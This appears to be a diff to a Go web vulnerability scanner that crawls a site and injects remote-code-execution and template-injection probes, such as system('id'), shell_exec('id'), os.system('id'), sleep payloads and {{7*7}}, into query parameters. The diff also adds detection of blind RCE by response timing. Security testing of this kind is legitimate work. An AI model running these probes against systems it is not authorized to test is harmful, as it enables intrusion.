@@ -44,6 +44,8 @@ type RCEScanner struct {
 	PageCountMu sync.Mutex
 	MaxDepth    int
 	Payloads    []string
+	Intensity   int
+	TargetedCVEs []string
 	Throttle    time.Duration
 }
 
@@ -53,8 +55,7 @@ type rceCrawlJob struct {
 	Depth int
 }
 
-// NewRCEScanner creates a new instance of the RCE scanner
-func NewRCEScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration) (*RCEScanner, error) {
+func NewRCEScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration, intensity int, targetedCVEs []string, customPayloads []string) (*RCEScanner, error) {
 	parsed, err := url.Parse(start)
 	if err != nil {
 		return nil, err
@@ -63,17 +64,21 @@ func NewRCEScanner(start string, workers, maxPages, maxDepth int, throttle time.
 		Timeout: 20 * time.Second,
 	}
 
+	payloads := generateRCEPayloads(intensity, targetedCVEs, customPayloads)
+
 	s := &RCEScanner{
-		StartURL: parsed,
-		Client:   client,
-		Visited:  make(map[string]bool),
-		Queue:    make(chan rceCrawlJob, 1000),
-		Findings: []FindingRCE{},
-		Workers:  workers,
-		MaxPages: maxPages,
-		MaxDepth: maxDepth,
-		Throttle: throttle,
-		Payloads: generateRCEPayloads(),
+		StartURL:     parsed,
+		Client:       client,
+		Visited:      make(map[string]bool),
+		Queue:        make(chan rceCrawlJob, 1000),
+		Findings:     []FindingRCE{},
+		Workers:      workers,
+		MaxPages:     maxPages,
+		MaxDepth:     maxDepth,
+		Throttle:     throttle,
+		Payloads:     payloads,
+		Intensity:    intensity,
+		TargetedCVEs: targetedCVEs,
 	}
 	return s, nil
 }
@@ -177,8 +182,6 @@ func (s *RCEScanner) fuzzURL(rawURL string) {
 	}
 
 	for param, values := range query {
-		originalValue := values[0]
-
 		for _, payload := range s.Payloads {
 			if s.Throttle > 0 {
 				time.Sleep(s.Throttle)
@@ -195,10 +198,12 @@ func (s *RCEScanner) fuzzURL(rawURL string) {
 			}
 			req.Header.Set("User-Agent", "Knife-RCE-Scanner/1.0")
 
+			startTime := time.Now()
 			resp, err := s.Client.Do(req)
 			if err != nil {
 				continue
 			}
+			duration := time.Since(startTime)
 
 			bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 50000))
 			resp.Body.Close()
@@ -217,8 +222,33 @@ func (s *RCEScanner) fuzzURL(rawURL string) {
 					Evidence:        evidence,
 				})
 			}
+
+			// Time-based blind RCE (SSTI/PHP etc)
+			if s.Intensity > 3 && (strings.Contains(payload, "sleep") || strings.Contains(payload, "7*7")) {
+				// For math-based SSTI
+				if strings.Contains(bodyStr, "49") {
+					s.addFinding(FindingRCE{
+						Type:            "Server-Side Template Injection (SSTI)",
+						URL:             testURL,
+						Param:           param,
+						Payload:         payload,
+						ResponseSnippet: "Found '49'",
+						Evidence:        "Math expression 7*7 evaluated to 49 in response.",
+					})
+				}
+				// For time-based
+				if duration >= 5*time.Second {
+					s.addFinding(FindingRCE{
+						Type:            "Blind RCE (Time-based)",
+						URL:             testURL,
+						Param:           param,
+						Payload:         payload,
+						ResponseSnippet: "N/A (Blind)",
+						Evidence:        fmt.Sprintf("Delayed response: %v (expected ~5s)", duration),
+					})
+				}
+			}
 		}
-		_ = originalValue
 	}
 }
 
@@ -244,28 +274,49 @@ func (s *RCEScanner) detectRCE(body string) (string, bool) {
 	return "", false
 }
 
-func generateRCEPayloads() []string {
-	return []string{
-		// PHP
+func generateRCEPayloads(intensity int, targetedCVEs []string, customPayloads []string) []string {
+	var payloads []string
+
+	// CVE-specific payloads
+	for _, id := range targetedCVEs {
+		if cve, ok := GetCVEDatabase()[id]; ok && cve.Type == ScannerRCE {
+			payloads = append(payloads, cve.Payloads...)
+		}
+	}
+
+	base := []string{
 		"phpinfo()",
-		"system('id')",
-		"exec('id')",
-		"shell_exec('id')",
-		"passthru('id')",
-		"`id`",
-		"${system('id')}",
-		// Python
-		"import os; os.system('id')",
-		"__import__('os').system('id')",
-		// Java (OGNL)
-		"${#context['xwork.MethodAccessor.denyMethodExecution']=false, #_memberAccess['allowStaticMethodAccess']=true, @java.lang.Runtime@getRuntime().exec('id')}",
-		// Template Injection (SSTI)
 		"{{7*7}}",
 		"${7*7}",
 		"<%= 7*7 %>",
-		"#{7*7}",
-		"*{7*7}",
 	}
+
+	if intensity > 2 {
+		base = append(base, []string{
+			"system('id')",
+			"exec('id')",
+			"shell_exec('id')",
+			"passthru('id')",
+			"`id`",
+			"${system('id')}",
+		}...)
+	}
+
+	if intensity > 3 {
+		base = append(base, []string{
+			"import os; os.system('id')",
+			"__import__('os').system('id')",
+			"sleep(5)",
+			"system('sleep 5')",
+		}...)
+	}
+
+	payloads = append(payloads, base...)
+	if len(customPayloads) > 0 {
+		payloads = append(payloads, customPayloads...)
+	}
+
+	return payloads
 }
 
 func (s *RCEScanner) markVisited(u string) bool {
